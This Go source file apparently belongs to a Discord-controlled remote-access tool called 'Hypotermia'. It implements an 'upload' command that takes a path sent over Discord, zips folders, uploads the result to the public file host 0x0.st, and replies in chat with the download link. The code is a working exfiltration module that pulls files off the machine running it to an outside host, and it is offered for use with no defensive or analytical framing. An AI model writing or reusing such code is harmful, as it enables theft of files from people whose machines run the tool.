package commands

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"

	"Hypotermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	uploadUsage string = "[path]"

	uploadArgsError     string = "🟥 Expected 1 argument."
	uploadFileInfoError string = "🟥 Failed to info about the path."
	uploadZipError      string = "🟥 Failed to zip folder."
	uploadOpenFileError string = "🟥 Failed to open file."

	uploadWriteFieldError string = "🟥 Failed to write field: "

	uploadFFError       string = "🟥 Failed to create form file."
	uploadCopyError     string = "🟥 Failed to copy file content."
	uploadCloseError    string = "🟥 Failed to close file."
	uploadHttpError     string = "🟥 Failed to create http request."
	uploadHttpSendError string = "🟥 Failed to send http request."
	uploadFailError     string = "🟥 Failed to upload file."
	uploadReadError     string = "🟥 Failed to read response body."

	uploadSuccess string = "🟩 Uploaded at: "
)

type UploadCommand struct{}

func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if len(args) == 0 {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadArgsError+"\nUsage: "+uploadUsage, m.Reference())
		return err
	}

	path := args[0]
	info, err := os.Stat(path)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
		return err
	}

	var filePath string
	if info.IsDir() {
		filePath, err = utils.ZipFolder(path)
		if err != nil {
			_, err := s.ChannelMessageSendReply(m.ChannelID, uploadZipError, m.Reference())
			return err
		}
	} else {
		filePath = path
	}

	file, err := os.Open(filePath)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadOpenFileError, m.Reference())
		return err
	}

	defer file.Close()

	var body bytes.Buffer
	mpWriter := multipart.NewWriter(&body)

	writer, err := mpWriter.CreateFormFile("file", filePath)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadFFError, m.Reference())
		return err
	}

	_, err = io.Copy(writer, file)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadCopyError, m.Reference())
		return err
	}

	err = mpWriter.WriteField("expires", "1")
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadWriteFieldError+"expires", m.Reference())
		return err
	}

	err = mpWriter.Close()
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadCloseError, m.Reference())
		return err
	}

	req, err := http.NewRequest("POST", "https://0x0.st", &body)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadHttpError, m.Reference())
		return err
	}

	req.Header.Set("Content-Type", mpWriter.FormDataContentType())

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	res, err := client.Do(req)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadHttpSendError, m.Reference())
		return err
	}

	defer res.Body.Close()

	resBody, err := io.ReadAll(res.Body)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadReadError, m.Reference())
		return err
	}

	url := strings.TrimSpace(string(resBody))

	if !strings.HasPrefix(url, "http") {
		_, err := s.ChannelMessageSendReply(m.ChannelID, uploadFailError, m.Reference())
		return err
	}

	_, err = s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(uploadSuccess+"%s", url), m.Reference())
	return err
}

func (*UploadCommand) Name() string {
	return "upload"
}

func (*UploadCommand) Info() string {
	return "uploads a chosen file or folder to 0x0.st"
}
